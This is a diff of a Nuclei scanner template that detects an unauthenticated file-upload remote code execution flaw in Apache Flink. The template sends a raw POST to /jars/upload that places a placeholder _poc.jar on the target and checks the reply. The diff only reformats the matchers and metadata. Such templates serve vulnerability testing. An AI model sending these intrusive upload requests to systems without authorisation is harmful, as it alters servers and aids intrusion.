@@ -1,5 +1,4 @@
 id: apache-flink-unauth-rce
-
 info:
   name: Apache Flink - Remote Code Execution
   author: pikpikcu
@@ -12,14 +11,29 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10
-    cwe-id: CWE-77
+    cwe-id: CWE-434,CWE-77,CWE-94
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive
     max-request: 1
-  tags: apache,flink,rce,intrusive,unauth,vuln
-
+  tags: apache,flink,intrusive,rce,unauth,vuln
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        part: header
+        type: word
+        words:
+          - application/json
+      - condition: and
+        part: body
+        type: word
+        words:
+          - success
+          - _poc.jar
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    raw:
       - |
         POST /jars/upload HTTP/1.1
         Host: {{Hostname}}
@@ -31,23 +45,3 @@ http:
 
           {{randstr}}
         --8ce4b16b22b58894aa86c421e8759df3--
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        words:
-          - "application/json"
-        part: header
-        condition: and
-
-      - type: word
-        words:
-          - "success"
-          - "_poc.jar"
-        part: body
-        condition: and
-
-      - type: status
-        status:
-          - 200
-
